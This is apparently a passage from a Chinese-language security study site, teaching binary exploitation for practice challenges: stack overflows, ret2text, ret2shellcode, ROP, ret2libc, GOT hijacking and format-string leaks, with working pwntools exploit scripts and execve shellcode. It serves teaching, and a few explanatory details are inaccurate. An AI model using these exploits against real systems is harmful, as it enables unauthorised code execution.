+<p>objdump：<code>objdump -d -M intel ./bof</code></p>
+<p>readelf：<code>readelf -a ./bof</code></p>
+<p>IDA Pro</p>
+<p>GDB-PEDA：checksec、vmmap、find</p>
+<ul>
+<li>直接运行<code>gdb ./pwn</code></li>
+<li>python通过pwn process运行，debug模式能看到进程号，然后<code>gdb attach 6223</code>接管调试</li>
+<li>进入pwndbg后可以使用<code>stack 30</code>、<code>x/40sx 0x7ffd65627058</code>等命令</li>
+</ul>
+<p>Pwntools：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#context(arch = &#39;i386&#39;, os = &#39;linux&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;x.x.x.x&#39;</span><span class="p">,</span><span class="mi">23333</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./hello&#39;)</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400586</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#p.send(asm(shellcraft.sh()))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>常用方法：</p>
+<div class="highlight"><pre><span></span><code><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span> <span class="mh">0xfaceb00c</span> <span class="o">=&gt;</span> <span class="s1">&#39;</span><span class="se">\x0c\xb0\xce\xfa\x00\x00\x00\x00</span><span class="s1">&#39;</span>
+<span class="n">u64</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="s1">&#39;</span><span class="se">\x0c\xb0\xce\xfa\x00\x00\x00\x00</span><span class="s1">&#39;</span> <span class="o">=&gt;</span> <span class="mh">0xfaceb00c</span>
+<span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span> <span class="mh">0xfaceb00c</span> <span class="o">=&gt;</span> <span class="s1">&#39;</span><span class="se">\x0c\xb0\xce\xfa</span><span class="s1">&#39;</span>
+<span class="n">u32</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="s1">&#39;</span><span class="se">\x0c\xb0\xce\xfa</span><span class="s1">&#39;</span> <span class="o">=&gt;</span> <span class="mh">0xfaceb00c</span>
+<span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">/</span> <span class="n">process</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span> <span class="mi">7</span> <span class="o">=&gt;</span> <span class="n">Hello</span> <span class="n">world</span><span class="err">!</span> <span class="o">=&gt;</span> <span class="s1">&#39;Hello w&#39;</span>
+<span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="s1">&#39;or&#39;</span> <span class="o">=&gt;</span> <span class="n">Hello</span> <span class="n">world</span><span class="err">!</span> <span class="o">=&gt;</span> <span class="s1">&#39;Hello wor&#39;</span>
+<span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="o">===</span> <span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="s1">&#39;payload&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;payload&#39;</span>
+<span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="s1">&#39;payload&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;payload</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="_2">二进制格式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><img alt="二进制格式" src="%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%BC%E5%BC%8F.png" /></p>
+<p>rodata：read only data，静态资源，常量、字符串等</p>
+<p>got：一个字典，存了每个函数（包括库函数）的地址</p>
+<p>bss：全局变量存储在此，临时变量存在栈中，会随着栈消失</p>
+<p>text：代码段（代码的汇编指令）</p>
+<h2 id="_3">函数调用传参<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="x64">X64<a class="headerlink" href="#x64" title="Permanent link">&para;</a></h3>
+<p>跟据函数参数从左到右的顺序，在调用函数前需将临时变量按顺序存入**寄存器**：</p>
+<div class="highlight"><pre><span></span><code>rdi, rsi, rdx, rcx, r8, r9
+</code></pre></div>
+<p>多余的临时参数将从后往前依次放入栈中（先进后出）</p>
+<p>将函数的**返回地址存入rax**</p>
+<p><img alt="函数传参" src="%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82.png" /></p>
+<h3 id="x86">X86<a class="headerlink" href="#x86" title="Permanent link">&para;</a></h3>
+<p>32位传参是**不使用寄存器**的，全靠栈储存参数，即：</p>
+<div class="highlight"><pre><span></span><code>push 0x800
+push 0x700
+push 0x600
+push 0x500
+push 0x400
+push 0x300
+push 0x200
+push 0x100
+call foo
+</code></pre></div>
+<p>并且64位栈宽度是8字节(16位)，而32位栈宽度是4字节</p>
+<h2 id="_4">栈格式<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h4 id="_5">函数调用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>当前栈空间结果，准备执行call函数</p>
+<p>注意：<strong>rip的值指向下一条汇编命令</strong></p>
+<p><img alt="函数调用-1" src="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-1.png" /></p>
+<p>执行到call函数，首先修改rip的值，并且将call的下一条命令的地址入栈（为了ret时候跳回到相应位置）</p>
+<p><img alt="函数调用-2" src="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-2.png" /></p>
+<p>然后正式进入函数，首先还是通用方法开辟栈空间</p>
+<div class="highlight"><pre><span></span><code>4004e7: push rbp
+4004e8: mov rbp, rsp
+4004eb: sub rsp, 0x10
+</code></pre></div>
+<p>第一步：将原地址栈底rbp入栈</p>
+<p>第二步：将新栈顶指针指向当前栈底指针</p>
+<p>第三步：将栈顶指针上移，开辟出0x10，即16字节空间</p>
+<p>最后就可以往开辟的空间里写入函数局部变量了</p>
+<p><img alt="函数调用-3" src="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-3.png" /></p>
+<h4 id="_6">函数返回<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>执行完函数逻辑，通常通过leave、ret返回到主函数</p>
+<p>首先是leave，虽然汇编就一行，但其实本质上执行了</p>
+<div class="highlight"><pre><span></span><code>mov rsp, rbp
+pop rbp
+</code></pre></div>
+<p>第一步：清空栈空间，将栈顶指针指向栈底</p>
+<p>第二步：将弹出的值赋给rbp，所以现在栈底指向最初的栈底</p>
+<p><img alt="函数调用-4" src="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-4.png" /></p>
+<p>然后执行ret，即pop当前栈顶的值至rip</p>
+<p>由于rip为下一条汇编指令，那么就刚好回到主函数call的后面了</p>
+<p><img alt="函数调用-5" src="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-5.png" /></p>
+<h2 id="_7">栈溢出<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>所以如果函数临时变量的值可以输入，并且超了所分配的栈空间</p>
+<p>如果我们能覆盖到rip的值（返回地址），就能劫持执行流</p>
+<p><img alt="栈溢出" src="%E6%A0%88%E6%BA%A2%E5%87%BA.png" /></p>
+<h2 id="return-to-text">Return to Text<a class="headerlink" href="#return-to-text" title="Permanent link">&para;</a></h2>
+<p>即返回的指针指向到Text段，通常为后门函数</p>
+<p>覆盖变量开辟的空间+8字节的old rbp</p>
+<p>最后加进去后门函数地址即可</p>
+<p><img alt="return to text" src="return%20to%20text.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bof&#39;</span><span class="p">)</span>
+
+<span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x400607</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;TEXT:&#39;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="return-to-shellcode">Return to Shellcode<a class="headerlink" href="#return-to-shellcode" title="Permanent link">&para;</a></h2>
+<p>这次没有现成的后门函数了，只能我们自己找一块**同时可读可写**的地址写入shellcode</p>
+<p>然后覆盖返回地址至我们的shellcode即可</p>
+<p><img alt="return to shellcode" src="return%20to%20shellcode.png" /></p>
+<p>一般shellcode调用execve函数</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">execve</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">argv</span><span class="p">[],</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">envp</span><span class="p">[]);</span><span class="w"></span>
+</code></pre></div>
+<p>根据函数传参方式：</p>
+<p>第一个变量filename存在rdi中，赋值为<code>/bin/sh</code>的地址</p>
+<p>第二个变量argv存在rsi中，赋值为0x0</p>
+<p>第三个变量envp存在rdx中，赋值为0x0</p>
+<p>最后调用syscall前需指明需要调用的函数，通过查**Linux系统调用表**(system call table)，0x3b代表syscall，所以需要给rax赋值为0x3b</p>
+<p>即汇编代码如下：</p>
+<div class="highlight"><pre><span></span><code>         0x h s / n i b /
+mov rbx, 0x68732f6e69622f
+push rbx
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 0x3b
+syscall
+</code></pre></div>
+<p>例：允许往bss段全局变量写入，以及局部变量存在栈溢出</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2sc&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+
+<span class="n">shellcode_addr</span> <span class="o">=</span> <span class="mh">0x601060</span>
+<span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;quanju:&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>  <span class="c1">#往bss段写shellcode</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;linshi:&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#覆盖返回地址跳到shellcode</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>bss段即可写又可执行，前提是没开NX</p>
+<h2 id="_8">栈保护方法<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<h3 id="canary">Canary<a class="headerlink" href="#canary" title="Permanent link">&para;</a></h3>
+<p>在old rbp前加入随机数，栈回收时检查该数是否被篡改</p>
+<p><img alt="Canary" src="Canary.png" /></p>
+<p>可以使用**格式化字符串漏洞**的任意栈地址读，先读取Canary的值，然后栈溢出时特地添加回去</p>
+<p>或者通过**任意栈地址写**，只改return地址这一个位置，不动Canary</p>
+<h3 id="nx">NX<a class="headerlink" href="#nx" title="Permanent link">&para;</a></h3>
+<p>可执行的地方不能写，可写的地方不可执行</p>
+<p>绕过方法ROP，用已有的片段构建ROP链子（用你本身代码执行，我不去写了）</p>
+<h3 id="aslr">ASLR<a class="headerlink" href="#aslr" title="Permanent link">&para;</a></h3>
+<p>空间地址随机化：每次执行程序时stack、heap、library的地址都不一样（基址不同，偏移一致）</p>
+<p><img alt="ASLR" src="ASLR.png" /></p>
+<h3 id="pie">PIE<a class="headerlink" href="#pie" title="Permanent link">&para;</a></h3>
+<p>开启后code段和data段（text段）也会启用ASLR</p>
+<p><img alt="PIE" src="PIE.png" /></p>
+<p>IDA打开发现text段（代码段）前面只能显示后3位（偏移），前面都是0</p>
+<h3 id="relro">RELRO<a class="headerlink" href="#relro" title="Permanent link">&para;</a></h3>
+<p>checksec的结果：</p>
+<p>FULL RELRO表示改不了got表</p>
+<p>Partial RELRO表明启用了懒加载Lazy Binding，可以改got表</p>
+<h2 id="got-hijack">GOT Hijack<a class="headerlink" href="#got-hijack" title="Permanent link">&para;</a></h2>
+<h3 id="lazy-binding">Lazy Binding 懒加载<a class="headerlink" href="#lazy-binding" title="Permanent link">&para;</a></h3>
+<p>所有的lib不会全都调用，只有初次使用时才会加载（把需要调用的库函数地址写入GOT表）</p>
+<p>说明开启Lazy Binding时GOT表是可写的，那么我们后期也可以修改GOT表的值，让该函数指向其他地方</p>
+<p>也可以修改GOT指向地址的内容，本质上是替换函数的内容</p>
+<p>GOT表集中存储了**每个函数的真实地址**</p>
+<h2 id="rop">ROP<a class="headerlink" href="#rop" title="Permanent link">&para;</a></h2>
+<p>通过不断去执行包含ret的程序汇编片段来达到想要的寄存器操作</p>
+<p>这些包含ret的汇编程序片段叫做gadget</p>
+<p>由众多的ROP gadget串成ROP Chain来作为我们的shellcode</p>
+<div class="highlight"><pre><span></span><code>4004fa: 48 83 c4 08 add rsp, 0x8
+4004fe: c3 ret
+
+4005b8: 5d pop rbp
+4005b9: c3 ret
+
+4006c4: c9 leave
+4006c5: c3 ret
+
+400730: 41 5e pop r14
+400732: 41 5f pop r15
+400734: c3 ret
+</code></pre></div>
+<p>此时我们往栈上从上往下填充数据时需要依次写入跳转地址，进入片段执行完gadget后会自动跳回到主函数</p>
+<table>
+<thead>
+<tr>
+<th>4004fa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4005b8</td>
+</tr>
+<tr>
+<td>4006c4</td>
+</tr>
+<tr>
+<td>400730</td>
+</tr>
+<tr>
+<td>......</td>
+</tr>
+</tbody>
+</table>
+<p>最终构造出execve函数(0x3b)</p>
+<p><img alt="image-20221114212512574" src="ROP.png" /></p>
+<ol>
+<li>pop rdi，把栈顶的值赋给rdi，此时rdi=0x6bb2e0，刚好是bss段地址</li>
+<li>pop rsi，把栈顶的值（<code>/bin/sh\x00</code>的指针地址）赋给rsi</li>
+<li>mov qword ptr [rdi], rsi，把rsi的值移动到rdi指针所指向的位置，也就是把<code>/bin/sh\x00</code>写入bss中</li>
+<li>pop rsi，把rsi赋值为0</li>
+<li>pop rdx，把rdx赋值为0</li>
+<li>pop rax，把rax赋值为0x3b</li>
+<li>syscall，此时rax是0x3b，也就是执行了execve函数，各个寄存器的值之前也铺垫好了</li>
+</ol>
+<h2 id="return-to-plt">Return to PLT<a class="headerlink" href="#return-to-plt" title="Permanent link">&para;</a></h2>
+<p><img alt="return to plt" src="return%20to%20plt.png" /></p>
+<p>依旧是ROP，只不过这次需要构造<code>system("sh");</code>函数。</p>
+<p>要获得shell需要做如下步骤：</p>
+<ul>
+<li>
+<p>获取system函数的地址。</p>
+</li>
+<li>
+<p>获取“/bin/sh”字符串的地址。</p>
+</li>
+<li>
+<p>将RDI中的值，改成“/bin/sh”字符串的地址。</p>
+</li>
+</ul>
+<p>**全局偏移表（GOT）**包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。</p>
+<p>**过程链接表（PLT）**包含每个全局函数的存根代码。代码段中的调用指令不直接调用函数（'function'），而是调用存根代码（function@PLT）。</p>
+<p>原理：</p>
+<p>用ida反编译目标程序后发现其中有printf,gets ,setvbuf，在内存这几个函数的got表地址是固定的。</p>
+<p>在执行printf函数前，edi指向的是格式化串，rsi指向的是被打印串的地址。</p>
+<p>如果控制了rsi那么我们就可以打印任何地址的内容。</p>
+<p>然后通过当前函数地址(gets) - system = 偏移地址 (两个函数的相对偏移是固定的)，得到一个固定的相对偏移地址。</p>
+<p>得到偏移地址后通过当前地址加上偏移得到system函数的内存地址，然后传入’/bin/sh’，执行system就达到目的。</p>
+<h2 id="return-to-libc">Return to libc<a class="headerlink" href="#return-to-libc" title="Permanent link">&para;</a></h2>
+<p>通过<code>ROPgadget --binary ./gothijack | grep "pop rax"</code>发现，自己写的代码没有所需要后面紧跟着ret的gadget，也就无法构造ROP。</p>
+<p><img alt="return to libc1" src="return%20to%20libc1.png" /></p>
+<p>然而libc中代码非常多，所需要的片段（execve或者system函数）通常都能搜到。</p>
+<p>所有版本的libc可以在这里找到 <a href="https://libc.nullbyte.cat/">libc database search</a></p>
+<p>根据puts函数的地址和偏移，计算出libc基址，再根据system函数的偏移，计算出system函数的地址。</p>
+<p>获得libc地址的地方有：栈、堆、got，栈中存着函数的真实地址，偏移通过libc可以直接获得，基址就有了。</p>
+<h2 id="_9">格式化字符串漏洞<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<h3 id="_10">常见函数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>基本介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>printf</td>
+<td>输出到stdout输入</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>输出到指定FILE流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定FILE流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置argv</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_11">漏洞原理<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>以<code>printf</code>为例，函数会一个一个读取参数。当前字符不是%，直接输出到相应的标准输出</p>
+<p>若当前字符是%，继续读取下一个字符：</p>
+<ul>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是%，输出%</li>
+<li>否则根据相应的字符，获取相应的参数，并对其进行解析并输出</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Color %s, Number %d, Float %4.2f&quot;</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+<p>其中：</p>
+<ul>
+<li><code>%s</code>输出地址对应的字符串，若地址对应空间不合法就会崩溃</li>
+<li><code>%d</code>输出内容对应的整型值</li>
+<li><code>%4.2f</code>输出内容对应的浮点值</li>
+</ul>
+<p>补充：</p>
+<ul>
+<li><code>%d</code>或者<code>%i</code>，有符号整数</li>
+<li><code>%u</code>，无符号整数</li>
+<li><code>%x</code>或者<code>%X</code>，16进制无符号整形，小x输出小写的16进制，大X输出大写的16进制</li>
+<li><code>%o</code>，8进制无符号整形</li>
+<li><code>%c</code>，输出一个字符</li>
+<li><code>%p</code>，后跟<code>&amp;a</code>输出对应变量的地址</li>
+<li><code>%n</code>，写入字符个数</li>
+</ul>
+<h3 id="_12">泄露内存<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<h4 id="_13">泄露栈内内存<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>使用<code>%x</code>、<code>%p</code>来获取对应栈的内存</p>
+<p>使用<code>%s</code>获取变量所对应地址的内容</p>
+<p>使用<code>%order$x</code>获取指定参数的值（order为栈内偏移）</p>
+<p>使用<code>%order$s</code>获取指定参数对应地址的值（order为栈内偏移）</p>
+<h4 id="_14">泄露任意内存<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p>假设格式化字符串相对函数调用第k个参数，那么可以通过<code>addr%k$s</code>来获取某个指定地址addr的内容</p>
+<h3 id="_15">覆盖内存<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<p><code>%n</code>把已经成功输出的**字符个数** 写入 对应的整形指针所指的变量，格式为：<code>[填充内容][需要覆盖的地址][填充内容]%[所覆盖地址为格式化字符串第几个参数]$n</code></p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../../Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 文件上传总结" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              文件上传总结
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-footer__link md-footer__link--next" aria-label="下一页: PTH传递攻击" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              PTH传递攻击
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2019 - 2022 F1rstb100d
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs"], "search": "../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d6c3db9e.min.js"></script>
+      
+    
+  </body>
+</html>
